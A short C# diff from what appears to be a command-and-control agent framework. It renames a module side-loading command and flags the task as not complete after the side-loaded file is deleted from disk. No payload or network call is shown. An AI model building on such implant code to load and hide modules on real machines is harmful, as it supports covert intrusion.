@@ -10,9 +10,9 @@ using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
-    public class SideLoadCommand : AgentCommand
+    public class SideLoadModuleCommand : AgentCommand
     {
-        public override string Name => "side-load";
+        public override string Name => "side-load-module";
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
@@ -49,6 +49,8 @@ namespace Agent.Commands
 
             File.Delete(path);
             this.Notify(result, commm, $"File deleted");
+
+            this.PreventTaskCompletion = true;
         }
     }
 }
